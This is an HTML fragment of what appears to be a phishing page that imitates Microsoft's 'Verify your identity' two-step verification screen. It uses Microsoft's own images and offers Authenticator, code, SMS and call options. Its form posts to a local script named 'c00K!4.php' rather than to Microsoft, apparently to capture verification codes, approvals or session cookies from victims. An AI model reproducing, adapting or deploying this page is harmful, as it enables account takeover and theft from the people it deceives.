        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="../c00K!4.php" onsubmit="return checkSubmit()">
            ...
            <div class="outer">
                <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
                                ...
                                <div data-viewid="1">
                                    ...
                                    <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                                        ...
                                        <div class="row text-title" id="loginHeader" role="heading">
                                            <div aria-level="1" data-bind="text: title" id="titleBox">Verify your identity
                                        ...
                                        <div class="placeholderContainer" id="emField">
                                            ...
                                            <div id="progressVerify" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait" style="display: none;">
                    ...
                    hasFocus: $data === $parent.focusedProof()" data-value="PhoneAppNotification" aria-describedby="idDiv_SAOTCS_Title">
                                                    <div class="table-row">
                                                        ...
                                                        <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                                                            <div data-bind="text: display">Approve a request on my Microsoft Authenticator app</div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                    ...
                    click: $parent.proof_onClick,
                    pressEnter: $parent.proof_onClick,
                    hasFocus: $data === $parent.focusedProof()" data-value="PhoneAppOTP">
                                                    <div class="table-row">
                                                        <div class="table-cell tile-img">
                                                            <div data-bind="component: { name: 'proof-image-control', params: { type: type } }">
                                                                <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_ea014b224eb1c04ac2f7cb85c43cc034.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg" data-bind="imgSrc, css: { 'small': small }" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg"><!-- /ko -->
                                                            </div>
                                                        </div>
                                                        <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                                                            <div data-bind="text: display">Use a verification code</div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                    ...
                    click: $parent.proof_onClick,
                    pressEnter: $parent.proof_onClick,
                    hasFocus: $data === $parent.focusedProof()" data-value="OneWaySMS">
                                                    <div class="table-row">
                                                        <div class="table-cell tile-img">
                                                            <div data-bind="component: { name: 'proof-image-control', params: { type: type } }">
                                                        ...
                                                        <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                                                            <div data-bind="text: display">Text <span id="numberSms"></span></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                    ...
                    hasFocus: $data === $parent.focusedProof()" data-value="TwoWayVoiceMobile">
                                                    <div class="table-row">
                                                        ...
                                                        <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                                                            <div data-bind="text: display">Call <span id="numberTelp"></span></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                        ...
                        ariaLabel: str['CT_STR_More_Info_AriaLabel']" aria-label="More information about two step verification">More information</a>
                                                    ...
                                                    <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
